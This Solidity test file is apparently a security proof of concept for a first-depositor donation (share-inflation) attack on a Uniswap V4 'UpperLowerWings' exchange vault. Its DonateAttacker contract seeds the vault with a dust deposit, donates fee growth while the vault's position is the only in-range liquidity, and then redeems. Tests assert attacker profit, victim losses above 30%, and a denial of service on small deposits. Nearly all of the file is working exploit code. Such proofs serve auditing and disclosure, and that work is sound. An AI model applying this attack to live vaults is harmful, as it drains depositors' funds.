// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVault as IWings} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {ModifyLiquidityParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TransientStateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";

/// Unprivileged attacker: owns its own full-range LP position, deposits/redeems through the public SE routes,
/// and donates fee growth through the public PoolManager.donate.
contract DonateAttacker is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;
    using StateLibrary for IPoolManager;
    IPoolManager immutable manager;
    IWings immutable vault;
    PoolKey key;
    IERC20 immutable t0;
    IERC20 immutable t1;
    int24 constant LO = -887220;
    int24 constant HI = 887220;
    bytes32 constant SALT = bytes32(uint256(0xA77));

    uint8 op;
    uint256 a;
    uint256 b;

    constructor(IPoolManager m, IWings v, PoolKey memory k) {
        manager = m; vault = v; key = k;
        t0 = IERC20(Currency.unwrap(k.currency0));
        t1 = IERC20(Currency.unwrap(k.currency1));
        t0.approve(address(v), type(uint256).max);
    }

    function addExternal(uint256 liq) external { op = 0; a = liq; manager.unlock(""); }
    /// remove own liquidity, donate `amt0` token0 to the in-range LPs (vault only), re-add own liquidity
    function donateWhileAlone(uint256 liq, uint256 amt0) external { op = 1; a = liq; b = amt0; manager.unlock(""); }

    function removeExternal(uint256 liq) external { op = 2; a = liq; manager.unlock(""); }
    /// push price into the vault's out-of-range target wing, donate while only the wing is active, restore price
    function donateInWing(uint256 liq, uint256 amt0) external { op = 3; a = liq; b = amt0; manager.unlock(""); }

    function deposit(uint256 amt) external returns (uint256) {(uint256 quotedAmountOut,) = IStandardExchangeIn(address(vault)).exchangeIn(t0, amt, IERC20(address(vault)), 0, address(this), false, block.timestamp);
    return quotedAmountOut;
    }

    function redeem(uint256 shares) external returns (uint256) {(uint256 quotedAmountOut,) = IStandardExchangeIn(address(vault)).exchangeIn(IERC20(address(vault)), shares, t0, 0, address(this), false, block.timestamp);
    return quotedAmountOut;
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(manager), "pm");
        if (op == 0) {
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, int256(a), SALT), "");
        } else if (op == 3) {
            (uint160 p0,,,) = manager.getSlot0(key.toId());
            manager.swap(key, SwapParams(false, -int256(1e30), TickMath.getSqrtPriceAtTick(90)), "");
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, -int256(a), SALT), "");
            manager.donate(key, b, 0, "");
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, int256(a), SALT), "");
            manager.swap(key, SwapParams(true, -int256(1e30), p0), "");
            (uint160 p1,,,) = manager.getSlot0(key.toId());
            require(p1 == p0, "price restored");
        } else if (op == 2) {
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, -int256(a), SALT), "");
        } else {
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, -int256(a), SALT), "");
            manager.donate(key, b, 0, "");
            manager.modifyLiquidity(key, ModifyLiquidityParams(LO, HI, int256(a), SALT), "");
        }
        _settle(key.currency0);
        _settle(key.currency1);
        return "";
    }

    function _settle(Currency c) private {
        int256 d = manager.currencyDelta(address(this), c);
        if (d < 0) {
            manager.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(manager), uint256(-d));
            manager.settle();
        } else if (d > 0) {
            manager.take(c, address(this), uint256(d));
        }
    }
}

contract WingsDonateInflationTest is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;

    address victim = address(0xB0B);
    DonateAttacker atk;
    uint256 constant EXT_L = 1e12;

    function _logVault(string memory tag) internal view {
        (,, uint128 core,) = wings0.position(0);
        (,, uint128 up,) = wings0.position(1);
        (,, uint128 lo,) = wings0.position(2);
        (uint256 l0, uint256 l1) = wings0.localReserves();
        console2.log(tag);
        console2.log("  supply", IERC20(address(wings0)).totalSupply(), "liqValue", wings0.liquidationValue().value);
        console2.log("  core/upper/lower L", core, up, lo);
        console2.log("  local0/local1", l0, l1);
        console2.log("  pool active L", pool.getLiquidity(key.toId()));
    }

    function _prepareTrap(uint256 seed, uint256 donation) internal returns (uint256 atkCost0) {
        atk = new DonateAttacker(pool, wings0, key);
        token0.mint(address(atk), 1e30);
        token1.mint(address(atk), 1e30);
        uint256 s0 = token0.balanceOf(address(atk));
        uint256 s1 = token1.balanceOf(address(atk));
        // 1. attacker provides the pool's external depth (fresh pool, no other LP)
        atk.addExternal(EXT_L);
        // 2. attacker is the first depositor of the fresh Wings vault
        uint256 sh = atk.deposit(seed);
        _logVault("after attacker seed deposit");
        // 3. permissionless keeper rebalance places the full-range core
        for (uint256 i; i < 12; ++i) {
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) returns (uint256) {} catch { break; }
        }
        _logVault("after rebalance");
        // 4. (no redeem needed: attacker keeps its whole dust seed supply)
        // 5. donate fee growth while the vault's core is the only in-range liquidity
        if (donation != 0) {
            (,, uint128 coreL,) = wings0.position(0);
            if (coreL != 0) atk.donateWhileAlone(EXT_L, donation);
            else atk.donateInWing(EXT_L, donation);
        }
        _logVault("after donation");
        sh;
        // capital the attacker has locked (token0 out of pocket; token1 delta reported separately)
        atkCost0 = s0 - token0.balanceOf(address(atk));
        console2.log("attacker token0 locked", atkCost0, "token1 delta", s1 - token1.balanceOf(address(atk)));
    }

    function _victimDeposit(uint256 amt) internal returns (uint256 shares) {
        token0.mint(victim, amt);
        vm.startPrank(victim);
        token0.approve(address(wings0), type(uint256).max);(uint256 preview,) = IStandardExchangeIn(address(wings0)).previewExchangeIn(token0, amt, IERC20(address(wings0)));
        console2.log("victim preview shares", preview);// honest victim uses its own preview as the slippage bound
        (shares,) = IStandardExchangeIn(address(wings0)).exchangeIn(token0, amt, IERC20(address(wings0)), preview, victim, false, block.timestamp);
        vm.stopPrank();
    }

    function _victimValue() internal view returns (uint256) {
        return FullMath.mulDiv(IERC20(address(wings0)).balanceOf(victim), wings0.liquidationValue().value, IERC20(address(wings0)).totalSupply());
    }

    function _run(uint256 seed, uint256 donation, uint256 victimAmt) internal returns (int256 profit0, uint256 victimOut) {
        uint256 a0 = 1e30; // initial token0 of attacker
        uint256 a1 = 1e30;
        _prepareTrap(seed, donation);
        uint256 vs = _victimDeposit(victimAmt);
        console2.log("victim deposited", victimAmt, "victim shares", vs);
        console2.log("victim entitlement after deposit", _victimValue());
        _logVault("after victim deposit");
        // attacker exits everything; remove its external LP too
        uint256 bal = IERC20(address(wings0)).balanceOf(address(atk));
        uint256 got = atk.redeem(bal);
        console2.log("attacker redeemed shares", bal, "for token0", got);
        // victim exits
        vm.startPrank(victim);
        uint256 vsh = IERC20(address(wings0)).balanceOf(victim);(victimOut,) = IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), vsh, token0, 0, victim, false, block.timestamp);
        vm.stopPrank();
        console2.log("victim redeemed for token0", victimOut);
        // remove attacker external LP to realize its fee share
        atk.removeExternal(EXT_L);
        int256 d0 = int256(token0.balanceOf(address(atk))) - int256(a0);
        int256 d1 = int256(token1.balanceOf(address(atk))) - int256(a1);
        console2.log("attacker net token0 (raw, 6dec)"); console2.logInt(d0);
        console2.log("attacker net token1 (raw, 18dec) -- still locked in external LP if negative"); console2.logInt(d1);
        profit0 = d0;
    }

    function test_inflation_seed10() public {
        uint256 v = 1.9e8;
        (int256 p, uint256 vOut) = _run(10, 1e9, v);
        _report(v, vOut, p);
        assertGt(p, 0, "attacker profit");
        assertLt(vOut, v * 7 / 10, "victim lost >30%");
    }

    function _report(uint256 v, uint256 vOut, int256 p) internal pure {
        console2.log("victim loss (token0 raw)"); console2.logInt(int256(v) - int256(vOut));
        console2.log("attacker profit (token0 raw)"); console2.logInt(p);
    }

    function test_inflation_seed100() public {
        uint256 v = 1.9e7;
        (int256 p, uint256 vOut) = _run(100, 1e9, v);
        _report(v, vOut, p);
        assertGt(p, 0, "attacker profit");
        assertLt(vOut, v * 7 / 10, "victim lost >30%");
    }

    function test_inflation_seed1000() public {
        uint256 v = 1.9e6;
        (int256 p, uint256 vOut) = _run(1000, 1e9, v);
        _report(v, vOut, p);
        assertGt(p, 0, "attacker profit");
    }

    function test_dos_smallDeposit() public {
        _prepareTrap(100, 1e9);
        token0.mint(victim, 5e6);
        vm.startPrank(victim);
        token0.approve(address(wings0), type(uint256).max);
        vm.expectRevert(bytes4(keccak256("ZeroIssue()")));IStandardExchangeIn(address(wings0)).exchangeIn(token0, 5e6, IERC20(address(wings0)), 0, victim, false, block.timestamp);
        vm.stopPrank();
    }

    function test_control_noDonation() public {
        uint256 v = 1.9e7;
        (int256 p, uint256 vOut) = _run(100, 0, v);
        _report(v, vOut, p);
        assertLe(p, 0, "control: no profit");
    }
}
